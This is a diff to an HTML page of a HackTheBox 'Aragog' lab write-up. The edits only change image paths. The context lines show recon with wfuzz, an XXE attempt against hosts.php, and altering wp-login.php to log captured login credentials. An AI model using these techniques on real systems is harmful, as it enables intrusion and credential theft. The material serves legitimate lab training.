@@ -69,7 +69,7 @@ ftp&gt; more test.txt
     &lt;subnet_mask&gt;255.255.255.192&lt;/subnet_mask&gt;
     &lt;test&gt;&lt;/test&gt;
 &lt;/details&gt;
-</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png></p><ul><li><code>wfuzz</code></li></ul><pre tabindex=0><code>└─$ wfuzz -u http://aragog.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H &#39;Host: FUZZ.aragog.htb&#39; --hw 28
+</code></pre><ul><li>Web server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/aragog/images/1.png></p><ul><li><code>wfuzz</code></li></ul><pre tabindex=0><code>└─$ wfuzz -u http://aragog.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H &#39;Host: FUZZ.aragog.htb&#39; --hw 28
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -106,7 +106,7 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
 200      GET       15l       74w     6143c http://aragog.htb/icons/ubuntu-logo.png
 200      GET      375l      968w    11321c http://aragog.htb/
 200      GET        3l        6w       46c http://aragog.htb/hosts.php
-</code></pre><h2 id=foothold>Foothold</h2><ul><li><a href=http://aragog.htb/hosts.php target=_blank rel=noopener>http://aragog.htb/hosts.php</a><ul><li>Could be related to <code>test</code> file we saw in <code>ftp</code></li></ul></li></ul><p><img src=./images/2.png></p><ul><li>If we try sending <code>POST</code> request with <code>test.txt</code> from <code>ftp</code>, we have a response back<ul><li>File format is <code>xml</code></li></ul></li></ul><pre tabindex=0><code>└─$ curl -X POST --data @test.txt http://aragog.htb/hosts.php
+</code></pre><h2 id=foothold>Foothold</h2><ul><li><a href=http://aragog.htb/hosts.php target=_blank rel=noopener>http://aragog.htb/hosts.php</a><ul><li>Could be related to <code>test</code> file we saw in <code>ftp</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/aragog/images/2.png></p><ul><li>If we try sending <code>POST</code> request with <code>test.txt</code> from <code>ftp</code>, we have a response back<ul><li>File format is <code>xml</code></li></ul></li></ul><pre tabindex=0><code>└─$ curl -X POST --data @test.txt http://aragog.htb/hosts.php
 
 There are 62 possible hosts for 255.255.255.192
 </code></pre><ul><li>We could try <code>XXE</code><ul><li><a href=https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity target=_blank rel=noopener>https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a></li></ul></li></ul><pre tabindex=0><code>&lt;!--?xml version=&#34;1.0&#34; ?--&gt;
@@ -313,7 +313,7 @@ OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 1
 ==================================================================================================================================================
 * Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU
 ...
-</code></pre><ul><li>Let&rsquo;s download <code>pspy</code> and run it<ul><li>We see <code>wp-login.py</code> being executed</li></ul></li></ul><p><img src=./images/3.png></p><ul><li>I can&rsquo;t access <code>wp-login.py</code>, but it implies that it&rsquo;s related to <code>Wordpress</code> login<ul><li>Also I can&rsquo;t use <code>tcpdump</code> to monitor the packets</li><li>We can modify <code>wp-login.php</code> to output the request to some file</li></ul></li></ul><p><img src=./images/4.png></p><ul><li>Now lets wait and see<ul><li>The file is created after a while</li></ul></li></ul><p><img src=./images/5.png></p><ul><li>We have creds</li></ul><pre tabindex=0><code>florian@aragog:/var/www/html/dev_wiki$ cat /tmp/request.log 
+</code></pre><ul><li>Let&rsquo;s download <code>pspy</code> and run it<ul><li>We see <code>wp-login.py</code> being executed</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/aragog/images/3.png></p><ul><li>I can&rsquo;t access <code>wp-login.py</code>, but it implies that it&rsquo;s related to <code>Wordpress</code> login<ul><li>Also I can&rsquo;t use <code>tcpdump</code> to monitor the packets</li><li>We can modify <code>wp-login.php</code> to output the request to some file</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/aragog/images/4.png></p><ul><li>Now lets wait and see<ul><li>The file is created after a while</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/aragog/images/5.png></p><ul><li>We have creds</li></ul><pre tabindex=0><code>florian@aragog:/var/www/html/dev_wiki$ cat /tmp/request.log 
 Array
 (
     [wp-submit] =&gt; Log In
